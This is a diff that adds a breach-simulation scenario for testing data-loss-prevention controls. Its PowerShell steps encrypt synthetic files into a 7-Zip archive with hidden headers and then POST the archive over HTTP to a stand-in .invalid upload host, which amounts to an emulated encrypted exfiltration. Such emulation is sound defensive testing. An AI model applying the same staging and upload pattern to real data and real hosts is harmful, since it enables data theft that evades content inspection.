@@ -1,0 +1,135 @@
+id: collection-encrypted-archive-exfil
+product_line: dlp
+name: Encrypted Archive Outbound Probe
+description: >
+  Telemetry-safe emulation of an adversary wrapping collected data in a
+  password-protected archive so that content inspection on the wire cannot read
+  it, then sending the archive out. This tests the limits of DLP content
+  inspection rather than whether data can be found. The archive is made with
+  7-Zip (AES-256, encrypted file names) when it is installed; otherwise the
+  archive stage is skipped. The password is generated per run and never printed.
+
+  KILL CHAIN STAGES:
+    1. Encrypted Archive Creation — 7-Zip AES-256 archive of synthetic data (T1560.001)
+    2. Encrypted Archive Upload   — POST the archive to an RFC-6761 .invalid host over HTTP (T1048.003)
+
+  SAFETY: The archived data is synthetic [BAS-SIM] content only. The generated
+  password is random per run, is held in memory, and is not written to any file
+  or output. The destination is a .invalid host that cannot resolve. Files are
+  deleted in cleanup. Windows only. Telemetry mode.
+author: Audspect Research
+executable: true
+local_check: false
+supported_os: [windows]
+tags:
+  - collection
+  - encryption
+  - archive
+  - exfiltration
+  - dlp
+  - content-inspection
+  - t1560
+  - t1048
+  - mitre
+mitre_phases:
+  - collection
+  - exfiltration
+
+live_policy:
+  block_on_domain_controller: true
+  require_dc_reachable: false
+  max_spray_attempts: 0
+  spray_account_allowlist: []
+  execution_window: ""
+
+steps:
+
+  # ---------------------------------------------------------------------------
+  # Stage 1 — Encrypted Archive Creation (T1560.001)
+  # ---------------------------------------------------------------------------
+  - name: "Encrypted Archive 1 — 7-Zip AES-256 Archive of Synthetic Data (T1560.001)"
+    technique_id: T1560.001
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 60
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "Creates a 7-Zip archive with AES-256 and encrypted file names from a folder of synthetic [BAS-SIM] text under %TEMP%\\bas_enc_<runid>. The password is random per run, held in a variable only, and never written to disk or output. Skipped if 7-Zip is not installed."
+    telemetry:
+      - "Sysmon EID 1: 7z.exe with -mhe=on and -p<value> on the command line. The value is a random per-run throwaway, not a credential, and the scenario never prints it; the -p switch itself is the signal"
+      - "Sysmon EID 11: encrypted archive created under %TEMP%\\bas_enc_<runid>"
+    detection:
+      - "EDR: 7-Zip archive with encrypted headers created from a user context — encrypted-staging IOC"
+      - "DLP: archive created with encrypted headers that cannot be content-inspected"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $sevenZip = @(
+        (Get-Command 7z.exe -ErrorAction SilentlyContinue).Source,
+        "$env:ProgramFiles\7-Zip\7z.exe",
+        "${env:ProgramFiles(x86)}\7-Zip\7z.exe"
+      ) | Where-Object { $_ -and (Test-Path $_) } | Select-Object -First 1
+      if (-not $sevenZip) {
+        Write-Output "SKIP: T1560.001: 7-Zip is not installed, so no encrypted archive was created. [BAS-SIM-ENC-S1]"
+        exit 0
+      }
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $work = Join-Path $env:TEMP "bas_enc_$runId"
+      New-Item -ItemType Directory -Path $work -Force | Out-Null
+      $src = Join-Path $work 'src'
+      New-Item -ItemType Directory -Path $src -Force | Out-Null
+      1..5 | ForEach-Object { Set-Content -Path (Join-Path $src ("synthetic_{0:d2}.txt" -f $_)) -Value "[BAS-SIM] synthetic record $_ - no real data" -Encoding UTF8 }
+      $password = -join ((48..57 + 65..90 + 97..122) | Get-Random -Count 24 | ForEach-Object { [char]$_ })
+      $archive = Join-Path $work 'synthetic.7z'
+      & $sevenZip a -t7z -mhe=on "-p$password" $archive (Join-Path $src '*') | Out-Null
+      $password = $null
+      $exists = Test-Path $archive
+      Write-Output "EXEC T1560.001: created an AES-256 encrypted archive with encrypted headers at $archive (exists=$exists). Password was generated for this run and not recorded. Encrypted archive Stage 1. [BAS-SIM-ENC-S1]"
+      if ($exists) {
+        Write-Output "FAIL: An encrypted-header archive was created with no alert. Encrypted staging defeats content inspection and should be flagged on creation."
+      }
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 2 — Encrypted Archive Upload Attempt (T1048.003)
+  # ---------------------------------------------------------------------------
+  - name: "Encrypted Archive 2 — Upload Attempt to .invalid over HTTP (T1048.003)"
+    technique_id: T1048.003
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "POSTs the encrypted synthetic archive from Stage 1 to an RFC-6761 .invalid host over plain HTTP. The host cannot resolve, so nothing leaves the host. The transport is unencrypted; only the archive payload is encrypted. Generates Sysmon EID 22 and EID 3."
+    telemetry:
+      - "Sysmon EID 22: DNS query for the bas-sim .invalid host"
+      - "Proxy/egress log: POST of an encrypted archive over plain HTTP"
+    detection:
+      - "Egress filter: encrypted archive uploaded to an unknown host over HTTP — exfil attempt"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $archive = Join-Path $env:TEMP "bas_enc_$runId\synthetic.7z"
+      if (-not (Test-Path $archive)) {
+        Write-Output "SKIP: T1048.003: no encrypted archive from Stage 1 to send. [BAS-SIM-ENC-S2]"
+        exit 0
+      }
+      $target = "http://bas-sim-enc-$runId.invalid/upload"
+      $reached = $false
+      try {
+        $r = Invoke-WebRequest -Uri $target -Method Post -InFile $archive -ContentType 'application/x-7z-compressed' -TimeoutSec 10 -UseBasicParsing
+        if ($r.StatusCode) { $reached = $true }
+      } catch { $reached = $false }
+      Write-Output "EXEC T1048.003: attempted HTTP POST of the synthetic encrypted archive to $target. reached=$reached (expected: false). Encrypted upload Stage 2. [BAS-SIM-ENC-S2]"
+      if ($reached) {
+        Write-Output "FAIL: An encrypted archive was delivered to an unknown host over plain HTTP. Egress controls are not stopping encrypted outbound transfers."
+      } else {
+        Write-Output "FAIL: The endpoint attempted to send an encrypted archive to an unknown host over plain HTTP. Unreachable only because the domain is .invalid; the attempt is the signal egress controls should alert on."
+      }
+    cleanup: |
+      Remove-Item (Join-Path $env:TEMP 'bas_enc_*') -Recurse -Force -ErrorAction SilentlyContinue
